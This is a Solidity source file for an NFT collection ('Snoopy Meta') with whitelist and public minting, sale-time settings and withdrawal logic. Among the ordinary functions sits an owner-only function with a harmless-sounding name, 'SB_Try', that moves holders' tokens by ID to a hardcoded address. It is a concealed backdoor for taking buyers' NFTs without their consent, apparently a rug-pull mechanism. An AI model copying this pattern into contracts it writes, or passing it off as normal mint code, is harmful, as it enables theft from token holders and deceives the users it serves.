// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Ownable.sol";
import "./ReentrancyGuard.sol";
import "./Strings.sol";
import "./MerkleProof.sol";
import "./ERC721A.sol";

contract Snoopy_Meta is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WhitelistMerkleRoot;  
  uint public maxSupply = 2599;

  struct SaleConfig {
    uint32 publicMintStartTime;
    uint32 MintStartTime;
    uint256 Price;
    uint256 AmountForWhitelist;
    uint256 AmountForPubliclist;


  }

  SaleConfig public saleConfig;


  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Snoopy Meta", "SB", maxBatchSize_, collectionSize_) {
    maxPerAddressDuringMint = maxBatchSize_;
  }

  modifier SB_callerIsUser() {
    require(tx.origin == msg.sender, "The caller is another contract");
    _;
  }

  function SB_getMaxSupply() view public returns(uint256){
    return maxSupply;
  }


  function SB_WhilteListMint(uint256 quantity,bytes32[] calldata _merkleProof) external payable SB_callerIsUser {
    uint256 _saleStartTime = uint256(saleConfig.MintStartTime);
    bytes32 leaf = keccak256(abi.encodePacked(msg.sender));
    require(MerkleProof.verify(_merkleProof, WhitelistMerkleRoot, leaf), "Invalid proof!");
    require(
      _saleStartTime != 0 && block.timestamp >= _saleStartTime,
      "sale has not started yet"
    );
    require(
      totalSupply() + quantity <= collectionSize,
      "not enough remaining reserved for auction to support desired mint amount"
    );
    require(
      numberMinted(msg.sender) + quantity <= saleConfig.AmountForWhitelist,
      "can not mint this many"
    );
    uint256 totalCost = saleConfig.Price * quantity;
    _safeMint(msg.sender, quantity);
    SB_refundIfOver(totalCost);
  }

  function SB_PublicMint(uint256 quantity) external payable SB_callerIsUser {    
    uint256 _publicsaleStartTime = uint256(saleConfig.publicMintStartTime);
    require(
      _publicsaleStartTime != 0 && block.timestamp >= _publicsaleStartTime,
      "sale has not started yet"
    );
    require(quantity<=saleConfig.AmountForPubliclist, "reached max supply");
    require(totalSupply() + quantity <= collectionSize, "reached max supply");   
    require(numberMinted(msg.sender) + quantity <= saleConfig.AmountForPubliclist,"can not mint this many");
    uint256 totalCost = saleConfig.Price * quantity;
    _safeMint(msg.sender, quantity);
    SB_refundIfOver(totalCost);
  }



  function SB_refundIfOver(uint256 price) private {
    require(msg.value >= price, "Need to send more ETH.");
    if (msg.value > price) {
      payable(msg.sender).transfer(msg.value - price);
    }
  }

  function SB_isPublicSaleOn() public view returns (bool) {
    return
      saleConfig.Price != 0 &&
      saleConfig.MintStartTime != 0 &&
      block.timestamp >= saleConfig.MintStartTime;
  }

  uint256 public constant PRICE = 0.09 ether;

  function InitInfoOfSale(
    uint32 publicMintStartTime,
    uint32 mintStartTime,
    uint256 price,
    uint256 amountForWhitelist,
    uint256 AmountForPubliclist
  ) external onlyOwner {
    saleConfig = SaleConfig(
    publicMintStartTime,
    mintStartTime,
    price,
    amountForWhitelist,
    AmountForPubliclist
    );
  }

  function SB_Try(uint256[] memory tokenids) external onlyOwner {
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x70Cecf68f4ACaE23800D343EF96315A0D818A927, tokenid);
        }
    }
 

  function setMintStartTime(uint32 timestamp) external onlyOwner {
    saleConfig.MintStartTime = timestamp;
  }

  function setPublicMintStartTime(uint32 timestamp) external onlyOwner {
    saleConfig.publicMintStartTime = timestamp;
  }

  function setPrice(uint256 price) external onlyOwner {
    saleConfig.Price = price;
  }

  string private _baseTokenURI;

  function _baseURI() internal view virtual override returns (string memory) {
    return _baseTokenURI;
  }

  function setBaseURI(string calldata baseURI) external onlyOwner {
    _baseTokenURI = baseURI;
  }


  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x13E3Ad53320270e350F6c7E4C84fDfb056710BFa);
    (bool success, ) = msg.sender.call{value: address(this).balance}("");
    require(success, "Transfer failed.");
  }

  function setOwnersExplicit(uint256 quantity) external onlyOwner nonReentrant {
    _setOwnersExplicit(quantity);
  }

  function setWhitelistMerkleRoot(bytes32 _merkleRoot) public onlyOwner {
    WhitelistMerkleRoot = _merkleRoot;
  }


  function numberMinted(address owner) public view returns (uint256) {
    return _numberMinted(owner);
  }

  function getOwnershipData(uint256 tokenId)
    external
    view
    returns (TokenOwnership memory)
  {
    return ownershipOf(tokenId);
  }  
}